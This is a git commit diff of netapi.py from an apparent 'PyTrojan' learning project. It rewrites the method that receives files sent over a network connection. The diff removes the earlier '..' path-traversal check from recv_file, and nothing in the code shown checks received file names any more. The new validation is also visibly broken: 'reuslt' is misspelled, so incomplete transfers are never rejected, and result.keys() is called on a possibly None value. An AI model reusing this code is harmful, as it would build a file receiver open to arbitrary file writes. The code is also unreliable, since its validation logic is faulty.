698dd5f8d8d26a62fb0e0cdcc090f5c81dfd1eda
Shung <jonson111088@gmail.com>
2020-01-20 14:11:26 +0800

    修改 NetAPI 接收檔案的部分

--- netapi.py
+++ netapi.py
@@ -10,6 +10,7 @@ import os
 #import sys
 import time
 import shutil
+import socket
 #from config import *
 #from common import *
 from inout import InitIO, InOutException
@@ -40,29 +41,95 @@ class NetAPI:
             oHandle = iHandle
         self.iHandle = InitIO(iHandle)
         self.oHandle = InitIO(oHandle)
-        self.savePath = 'D:\\PyTrojan\\SavedFiles'     # 存檔目錄
+        self.savePath = 'D:\\PyTrojan\\SavedFiles'      # 存檔目錄
         self.maxSize = 2147483647                       # 最大檔案限制
         self.blockSize = 1024                           # 區塊大小
         
     def recv_file(self):    # API
+        receiver = {
+            FILE_NAME_TAG     :  self.recv_name,
+            FILE_SIZE_TAG     :  self.recv_size,
+            FILE_COONTENT_TAG :  self.recv_content,
+            FILE_BLOCK_TAG    :  self.recv_blocks,
+        }
         result = {}
+        
         while True:
-            tag = self.recv_tag()
-            if not tag or tag in [FILE_END_TAG, FILE_ABORT_TAG]: break
+            tag = None
+            #loggin.debug('wait for tag')
+            try:
+                data = self.recv_data()  # 無用資料
+                #logging.warning('Catch unidentified data')
+                if not data:    break    # 沒資料了，結束
+                continue
+            except InOutException as e:
+                tag = e.args[0]         # 取得檔案標籤
+            except socket.error as e:   # 網路的錯誤無法在這裡解決
+                #loggin.error(f'Exception: {str(e)}')
+                raise
+            except Exception as e:
+                #loggin.error(f'Exception: {str(e)}')
+                print('Exception', str(e))
+                break
             
-            if tag == FILE_BLOCK_TAG:   # 如果是傳區塊，用讀區塊的方式讀取
-                data = self.recv_blocks()
-            else:                       # 用一般方式讀取
-                data = self.recv_data()
-                if not data: break
+            # logging.debug(f'Get tag: {tag}')
+            if not tag:        # 不是標籤，重新取得
+                continue
+            elif tag == FILE_BEGIN_TAG: # 檔案傳送開始
+                result= {}      # 檔案初始化
+                self.send_success()
+            elif tag == FILE_END_TAG:   # 檔案傳送結束
+                self.send_success()
+                break
+            elif tag == FILE_ABORT_TAG:
+                #logging.debug('abort')
+                result = {}
+                continue
+            #self.send_success()  <-- ??
             
-            if tag == FILE_NAME_TAG:
-                namelist = data.split('\t')
-                if '..' in namelist:
-                    raise ValueError('Dangerous path')
-                data = os.path.join(*namelist)
-                
-            result[tag] = data
+            try:
+                #logging.debug('Wait for receive data')
+                data = receiver.get(tag, (lambda:None))()     # 取得檔案資料
+                if data is None:    break   # 沒資料就停止
+                result[tag] = data      # 資料放進回傳值
+                #logging.debug('Send success after receive data')
+                #self.send_success()
+                continue
+            except InOutException as e:
+                tag = e.args[0]         # 取得檔案標籤
+                break                   # 這裡不該取得標籤，無論是甚麼，都中斷
+            except socket.error as e:   # 網路的錯誤無法在這裡解決
+                raise
+            except Exception as e:
+                #loggin.error(f'Exception: {str(e)}')
+                print('Exception', str(e))
+                break
+        if not result:  # 客戶端如果結束，中斷連線，result 會是空的
+            result = None
+        else:
+            if FILE_NAME_TAG not in result:     # 缺了檔名
+                print('Name not found', result)
+                reuslt = None
+            elif FILE_SIZE_TAG not in result:   # 缺了檔案大小
+                print('Size not found', result)
+                reuslt = None
+            elif FILE_COONTENT_TAG not in result \
+                and FILE_BLOCK_TAG not in reuslt:   # 缺了檔案內容
+                print('Content not found', result)
+                reuslt = None
+            response = FILE_SUCCESS_TAG if result else FILE_FAIL_TAG
+            self.send_tag(response)     # 沒缺資料就傳送成功，否則傳送失敗
+
+        # 設 flag 檢查收取的資料
+        essential_flag = {
+            FILE_NAME_TAG       : 1,
+            FILE_SIZE_TAG       : 2,
+            FILE_COONTENT_TAG   : 4,
+            FILE_BLOCK_TAG      : 4,
+        }
+        flag = sum([ essential_flag.get(x) for x in result.keys() ])
+        if flag != 7:   # 有缺少資料
+            result = None
         return result
     
     def send_file(self, path):    # API
